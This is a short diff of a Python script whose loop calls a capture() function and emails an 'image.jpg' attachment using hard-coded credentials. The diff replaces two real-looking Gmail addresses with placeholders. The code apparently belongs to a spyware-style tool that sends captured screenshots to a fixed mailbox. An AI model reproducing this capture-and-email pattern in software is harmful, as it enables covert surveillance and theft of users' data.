@@ -12,8 +12,8 @@ while True:
     message = ""
     def sendEmail(message):
         capture()
-        From = "cbjhbxndmsh@gmail.com"
-        email = "ndinhducanh@gmail.com"
+        From = "email"
+        email = "email"
         passw = "pass"
         attachment = 'image.jpg' 
         body = message
